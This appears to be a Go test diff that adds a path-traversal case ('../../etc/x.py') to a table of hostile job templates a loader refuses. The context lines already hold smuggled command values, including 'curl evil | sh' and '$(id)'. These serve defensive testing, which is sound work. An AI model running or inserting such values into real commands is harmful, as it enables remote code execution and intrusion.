@@ -51,6 +51,9 @@ func TestHostileTemplatesAreRefusedAtLoad(t *testing.T) {
 		{"shell text in the command", func(d map[string]any) {
 			tplOf(d)["command"] = []any{"srun", "--ntasks=1", "python3", "x.py; curl evil | sh"}
 		}, "command"},
+		{"a parent folder in the command", func(d map[string]any) {
+			tplOf(d)["command"] = []any{"srun", "python3", "../../etc/x.py"}
+		}, "command"},
 		{"command substitution in the command", func(d map[string]any) {
 			tplOf(d)["command"] = []any{"srun", "python3", "$(id)"}
 		}, "command"},
